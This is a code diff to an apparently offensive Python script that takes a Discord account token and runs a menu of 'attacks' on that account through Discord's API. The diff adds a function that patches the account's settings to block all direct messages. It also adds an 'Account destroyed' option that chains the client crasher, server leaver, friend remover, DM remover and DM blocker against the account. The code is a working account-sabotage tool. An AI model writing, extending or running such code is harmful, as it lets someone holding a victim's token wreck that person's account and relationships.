@@ -1,6 +1,22 @@
 import requests, os, time, random, string
 
 class attacks():
+
+    def disable_dms(token):
+        headers = {
+            "authorization": token
+        }
+        settings = {
+            "friend_source_flags": 
+            {
+                "all": False,
+                "mutual_friends": False,
+                "mutual_guilds": False,
+            }
+        }
+        x = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=settings)
+        if x.status_code == 200:
+            print("[*] Disabling all DMs")
     
     def client_crasher(token):
         headers = {
@@ -99,7 +115,8 @@ def main():
     print("[2] Server leaver")
     print("[3] Message remover")
     print("[4] Friend remover")
-    print("[5] DM remover")
+    print("[5] DM remover\n")
+    print("[6] Account destroyed")
 
     time.sleep(1)
     attack = int(input("\n[?] Select attack: "))
@@ -139,6 +156,25 @@ def main():
         time.sleep(1)
         os.system("cls")
         main()
+    elif attack == 6:
+        a = input("[*] Are you sure? (Y/n)")
+        if a.lower() != "n":
+            os.system("cls")
+            attacks.client_crasher(token)
+            os.system("cls")
+            attacks.server_leaver(token)
+            os.system("cls")
+            attacks.friend_remover(token)
+            os.system("cls")
+            attacks.dm_remover(token)
+            os.system("cls")
+            attacks.disable_dms(token)
+            input("\n[*] Attack executed, press enter to continue.. ")
+            time.sleep(1)
+            os.system("cls")
+            main()
+        else:
+            main()
     
 main()
     
